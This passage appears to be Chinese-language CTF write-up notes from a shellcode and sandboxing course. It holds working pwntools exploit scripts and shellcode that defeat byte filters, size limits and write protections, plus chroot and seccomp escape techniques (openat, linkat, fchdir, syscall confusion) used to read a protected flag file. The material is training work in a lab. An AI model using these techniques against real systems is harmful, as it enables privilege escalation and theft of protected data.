<h2 id="4-造一个跳板"><a href="#4-造一个跳板" class="headerlink" title="4.造一个跳板"></a>4.造一个跳板</h2><blockquote>
<p>使用encode函数: No encoders for amd64 which can avoid b’H’</p>
<p>mov的一种编码第一个字节就是H, 所以没有办法.</p>
<p>只能使用先read再jmp的方法.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment"># 通过测试程序的打印功能查到read编码0xf字节, 所以不用jmp直接接在后面</span><br>shellcode = shellcraft.amd64.read(<span class="hljs-number">0</span>, addr+<span class="hljs-number">0xf</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.sendline(payload)<br>p.recv() <span class="hljs-comment"># 无关紧要</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>payload = asm(shellcode)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<h2 id="5-禁用syscall系列"><a href="#5-禁用syscall系列" class="headerlink" title="5.禁用syscall系列"></a>5.禁用syscall系列</h2><blockquote>
<p>啊这, 我这……. 折腾了半天重新看了看课件终于知道他要考我什么了.</p>
</blockquote>
<p>还可以用<code>mov byte ptr [rip + s01], 0x0f</code>这样的来改变shellcode本身. 依据在于将0f05两个字节分开来.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov byte ptr [rip+syscall1], 0x0f<br>mov byte ptr [rip+syscall2], 0x05<br></code></pre></div></td></tr></table></figure>

<p>exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary    <span class="hljs-comment"># 例行解决arch问题</span><br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br><span class="hljs-comment"># dec BYTE PTR [rip+1]</span><br><span class="hljs-comment"># b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span><br>payload = asm(shellcode)<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-comment"># len = len(payload)</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(payload):<br>    <span class="hljs-keyword">if</span> payload[i]==<span class="hljs-number">0x0f</span> <span class="hljs-keyword">and</span> payload[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0x05</span>:<br>        <span class="hljs-comment"># 发现syscall的0x0f05的时候换成一条dec指令+0x0f06, 注意到opcode已经换成了0x0f06</span><br>        <span class="hljs-comment"># 即CLTS(Clear Task-Switched Flag in CR0)指令.</span><br>        <span class="hljs-comment"># 如果整个0f04不存在的指令也行, 不会引起反汇编出现SIGSEGV</span><br>        payload = payload[:i] + <span class="hljs-string">b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x0f\x06&#x27;</span> + payload[i+<span class="hljs-number">2</span>:]<br>        i+=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">else</span>:<br>        i+=<span class="hljs-number">1</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<p>6.同上, 限制前0x1000写入权限, 总共可写入0x2000</p>
<blockquote>
<p>只要read的buf在后4096字节, 然后<code>payload = payload.rjust(0x1500, b&#39;\x90&#39;)</code>即可.</p>
<p>居然栽在rjust这个函数上: 第一次以为rjust直接修改bytes, 但发现是个不可修改的class, 然后发现width是指修改完后的长度而不是直接在左边填充多少fillchar…</p>
</blockquote>
<h2 id="7-关闭stdio"><a href="#7-关闭stdio" class="headerlink" title="7.关闭stdio"></a>7.关闭stdio</h2><blockquote>
<p>照着课件的说法是每次返回1bit都能communicate…….</p>
<p>不过直接打开另外一个文件就行了. 居然栽在open syscall的o_flag上, 应该给个O_WRONLY或者O_RDWR.</p>
<p>shellcraft的open函数能接受int的o_flag或者字符串类型的flag. 只支持大写(这不是当然么, 汇编器只支持这种宏定义).</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#打开文件, rax存储fd, 从文件中读取到内存中addr+0x100, 然后写到stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/res&quot;</span>, <span class="hljs-number">1</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br></code></pre></div></td></tr></table></figure>

<h2 id="8-限制写权限"><a href="#8-限制写权限" class="headerlink" title="8.限制写权限"></a>8.限制写权限</h2><blockquote>
<p>而且第一次只有0x12(18)字节的汇编字节可以输入. 后面的字节使用了 <code>mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC)</code>来限制再次write.</p>
</blockquote>
<p>emmmmmm……….</p>
<p>tips:</p>
<blockquote>
<p>In fact these are a lot of bytes. Try different <strong>sys calls</strong>. There are other ways to read a flag as well</p>
<p>Search for a syscall that takes minimal argument so as to decrease size</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/syscalls.2.html">syscalls man7</a> </p>
<p>找了半天, 只有个chmod能用, 居然刚好18字节, 真绝啊. 一开始想着读取文件肯定是做不到的, 因为只能写到buffer上, 塞不下更多的逻辑了.  18个字节真的太少, 只能换一个方向而去改变他的权限, 然后就可以任意读取了.</p>
<p>为了尽量节省空间, <code>&#39;/flag&#39;</code>放在了bytes的最后, 由起始地址addr计算出<code>/</code>的位置, 取代s1中9所在位置.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    mov edi, 9</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pos = s1.find(<span class="hljs-string">&#x27;9&#x27;</span>)<br>s1 = s1[:pos] + <span class="hljs-built_in">hex</span>(addr+<span class="hljs-number">12</span>) + s1[pos+<span class="hljs-number">1</span>:]<br>temp = asm(s1)<br>payload = payload + <span class="hljs-string">b&#x27;/flag&#x27;</span><br></code></pre></div></td></tr></table></figure>

<blockquote>
<p>不一定要用这种替换, 可以使用<code>lea rdi, [rip+0x??]</code> , 或者下面这个chown系统调用.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">lea rdi, [rip+0xf]<br>mov si, 0x3e8<br>mov dx, si<br>mov al, 92<br>syscall # chown(const char *pathname, uid_t owner, gid_t group)<br></code></pre></div></td></tr></table></figure>
</blockquote>
<p>13.同上, 而且变成0xc字节, 看来只能chown或者chmod了, 这里用chmod.</p>
<ul>
<li><p>?????好吧应该push到栈上, 然后再mov rsp, 这样子才能大幅度地减少字节长度.</p>
<p>而且由于是小端法存储, 自然地就有7个空字符在0x66后面.<br>gdb一看rax是put函数的返回值, 直接就是0. 这点挺重要: <strong>利用可预测的寄存器的值</strong> </p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">push byte ptr &#x27;f&#x27;    ;6a 66 <br>mov rdi, rsp		;48 89 e7<br>mov sil, 0x04		;40 b6 04<br>mov al, 0x5a		;b0 5a <br>syscall			    ;0f 05 长度为0xb  <br></code></pre></div></td></tr></table></figure>

<p>第二种方案是execv, 去执行shell, 不过文件开头要这么写<code>#!/bin/sh -p</code>, -p是防止默认的重置SUID操作. shell里面直接写<code>cat /flag</code>就成了</p>
<h2 id="9-被动修改"><a href="#9-被动修改" class="headerlink" title="9.被动修改"></a>9.被动修改</h2><blockquote>
<p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an<br>instruction is an <code>INT 3</code>, which is an interrupt to call into the debugger. You must avoid these modifications in your<br>shellcode.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    lea edi, [rip+0x22]</span><br><span class="hljs-string">    jmp done</span><br><span class="hljs-string">    .space 12</span><br><span class="hljs-string">done:</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    .skip 13</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(s1) + <span class="hljs-string">b&#x27;/flag\x00&#x27;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="10-sort-ur-shellcode"><a href="#10-sort-ur-shellcode" class="headerlink" title="10.sort ur shellcode"></a>10.sort ur shellcode</h2><blockquote>
<p>每8个字节作为一个64位无符号数, 使用冒泡排序升序排列. emmmmmm……</p>
</blockquote>
<p>非常刚好的每8字节从小到大排序, 主要的思想就是代码尽量少, 打开文件和读写放到另外一个文件中(c写的读文件), execve会继承父进程权限.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#   0:   68 2e 2f 61 00          push   0x612f2e</span><br><span class="hljs-comment">#   5:   48 89 e7                mov    rdi, rsp</span><br><span class="hljs-comment">#   8:   31 d2                   xor    edx, edx</span><br><span class="hljs-comment">#   a:   31 f6                   xor    esi, esi</span><br><span class="hljs-comment">#   c:   6a 3b                   push   0x3b</span><br><span class="hljs-comment">#   e:   58                      pop    rax</span><br><span class="hljs-comment">#   f:   0f 05                   syscall</span><br></code></pre></div></td></tr></table></figure>

<p>11.同上, 关闭stdin</p>
<blockquote>
<p>上一题仍然继续用.</p>
</blockquote>
<h2 id="12-每个byte得unique"><a href="#12-每个byte得unique" class="headerlink" title="12.每个byte得unique"></a>12.每个byte得unique</h2><blockquote>
<p><code>ascii_values = [ord(character) for character in text]</code>python字符串=&gt;ASCII</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    lea edx, [esi] /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure>

<p>出乎意料的简单, 只要把第二个xor改成lea指令去清空edx就可以了. 一开始改的mov还不行.</p>
<h2 id="14-只读6个字节"><a href="#14-只读6个字节" class="headerlink" title="14.只读6个字节"></a>14.只读6个字节</h2><blockquote>
<p>好像只能2-stage shellcode, emmmmmmmm…….</p>
</blockquote>
<p>仍然是利用了rax等于0, rdx是shellmem地址, 也可以当做是要读取的字节数使用read函数的话只有rsi(第二个参数)需要改为rdx上的地址, 简单mov就可以了. 然后第二阶段随便整.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">mov esi, edx</span><br><span class="hljs-string">syscall	//call read(0, 0x14e40000, 0x14e40000)</span><br><span class="hljs-string">//2-stage shellcode</span><br><span class="hljs-string">.space 6, 0x90</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode += shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br>shellcode += shellcraft.amd64.write(<span class="hljs-number">1</span>,    <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure>

<h1 id="module-5"><a href="#module-5" class="headerlink" title="module 5"></a>module 5</h1><ul>
<li><p>chroot(“/tmp/jail”)</p>
<ul>
<li><p>chroot(“/tmp/jail”) does NOT:</p>
<p>Close resources that reside outside of the jail.<br>cd (chdir()) into the jail.<br>Do anything else!</p>
</li>
<li><p>you can use open<strong>at</strong> and execve<strong>at</strong>: <code>int openat(**int dirfd**, char *pathname, int flags);</code></p>
<p>这两个函数的path如果是绝对路径, 那么dirfd就会被忽略;<br>如果path是相对路径, 而且dirfd是合法的, 那么path所引用的就是dirfd所表示的路径.</p>
</li>
<li><p>如果再次chroot会发生什么? kernel对此是完全不知情的.</p>
</li>
<li><p>Generally, a user with an effective ID of 0 (i.e., a process run as root or SUIDed to root) can <em><strong>always</strong></em> break out of a chroot, unless the chroot syscall is blocked!</p>
</li>
<li><p>Also missing other forms of isolation: <strong>PID, network, IPC</strong> </p>
</li>
<li><p>Replacements: <strong>cgroups, namespaces, seccomp</strong> </p>
</li>
</ul>
</li>
<li><p>seccomp: </p>
<ul>
<li><code>gcc -o test test.c -lseccomp</code> <code>seccomp-tools dump ./test</code> </li>
<li>原理是eBPF, seccomp就是使用的eBPF来实现的, 还可以用来实现一系列system trace <a target="_blank" rel="noopener" href="https://github.com/iovisor/bcc">tools</a> </li>
</ul>
</li>
<li><p>break out seccomp: Generally, to do anything useful, a sandboxed process needs to be able to communicate with the privileged process. 有两点可能, 第一是syscall很多, 有些可能可以被利用, 第二是开发者可能为了不破坏功能而在权限方面犯错误.</p>
<ul>
<li><strong>permissive policies</strong>: ptrace() sendmsg() prctl() process_vm_writev()</li>
<li><strong>syscall confusion:</strong> on some systems, you can switch between 32-bit mode with 64-bit mode <em>in the same process</em>, and the syscall numbers are different between architectures. 比如说系统调用分别是<code>int 0x80 and syscall</code>(<code>\xcd\x80 and \x0f\x05</code>), 系统调用号也不同.</li>
<li><strong>kernel vulnerabilities</strong> in the syscall handlers: Over 30 chrome sandbox escapes in 2019 <a target="_blank" rel="noopener" href="https://github.com/allpaca/chrome-sbx-db">link</a> </li>
<li>data exfiltration: such as sleep(), exit(), normal or crash. Or use DNS queries to bypass network egress filters.</li>
</ul>
</li>
</ul>
<blockquote>
<p>Redirections很重要. <a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">link</a> </p>
</blockquote>
<p>补充:</p>
<ul>
<li>实际测试中在shell里面直接使用chroot命令并不会发生escape, 只能在c代码中使用chroot库函数. 猜测可能是因为chroot的命令行对系统调用进行了一层封装, 加上了跳转到jail里面的目录中; 而libc库中只是单纯的系统调用, 并没有chdir这个步骤.</li>
<li>好几个函数都有<code>at</code>的版本, chmod-&gt;fchmodat, open-&gt;openat(open只是libc中对openat的封装) and so forth.</li>
<li></li>
</ul>
<h3 id="1-exemplify"><a href="#1-exemplify" class="headerlink" title="1.exemplify"></a>1.exemplify</h3><p>相当简单, 直接利用程序中chroot后没有切换到jail里面的特点, 更改cwd为真正的根目录, 第一个参数填写为flag, 最后open的时候由于flag是相对地址, 会以真正的根目录作为基准来定位true flag.</p>
<h3 id="2-同第一题"><a href="#2-同第一题" class="headerlink" title="2.同第一题"></a>2.同第一题</h3><blockquote>
<p>第一个参数不能含有flag字符串, 是为了禁止直接打开flag文件. 在这个challenge中还可以注入shellcode, </p>
</blockquote>
<p>也没什么难的, 只要在shellcode里面打开‘flag’然后写到stdin里面就可以了.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/baby*[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process([binary, <span class="hljs-string">b&#x27;abc&#x27;</span>]) <span class="hljs-comment">#不能直接打开flag文件</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;O_RDWR&#x27;</span>)<br>shellcode+= <span class="hljs-string">&#x27;lea r8, [rip]\nadd r8, 0x100&#x27;</span>	<span class="hljs-comment">#写到buf上, 估计很快就不行了.</span><br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br>payload += <span class="hljs-string">b&#x27;\x0f\x04&#x27;</span>	<span class="hljs-comment"># 随手加个非法指令,遇到SIGILL就知道shellcode肯定是执行完了.</span><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<h3 id="3-move-in"><a href="#3-move-in" class="headerlink" title="3.move in"></a>3.move in</h3><p>参数不能含有flag子串, 打开文件时有O_NOFOLLOW标志, 软连接无效,  而且在chdir之前只有一个open.<br>也不能在命令行里打开flag, 包括符号链接. 要跳出chroot也许只剩下再次chroot. 好像也不行, 看了看视频应该要用openat.<br>在kali上试试chroot. openat成功了.</p>
<ul>
<li>directory stream file descriptor和file descriptor不是同一个东西, 具体资料待查. openat只能用dirfd.</li>
<li>命令行里打出<code>./chroot flag 6&lt;.</code>即可, 会打开当前文件夹且dirfd=6.</li>
<li><strong>也可以直接打开fd=3, 这个是命令行第一个参数, 而且在chroot前被打开, 可以被openat使用.</strong> </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>shellcode = shellcraft.amd64.openat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>) <br>shellcode += shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>) <br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/home/hacker/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure>

<h3 id="4-seccomped-gt-openat"><a href="#4-seccomped-gt-openat" class="headerlink" title="4.seccomped -&gt; openat"></a>4.seccomped -&gt; openat</h3><blockquote>
<p>每一题的要求都在逐渐增加. 这一题仍然可以用openat, 没有变化.</p>
</blockquote>
<h3 id="5-linkat"><a href="#5-linkat" class="headerlink" title="5. linkat"></a>5. linkat</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.linkat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;AT_FDCWD&quot;</span>, <span class="hljs-string">&#x27;/f&#x27;</span>, <span class="hljs-number">0</span>)<br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure>

<h3 id="6-fchdir"><a href="#6-fchdir" class="headerlink" title="6.fchdir"></a>6.fchdir</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.fchdir(<span class="hljs-number">6</span>)                       <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure>

<h3 id="7-没有at了"><a href="#7-没有at了" class="headerlink" title="7.没有at了"></a>7.没有at了</h3><p>允许的syscall:</p>
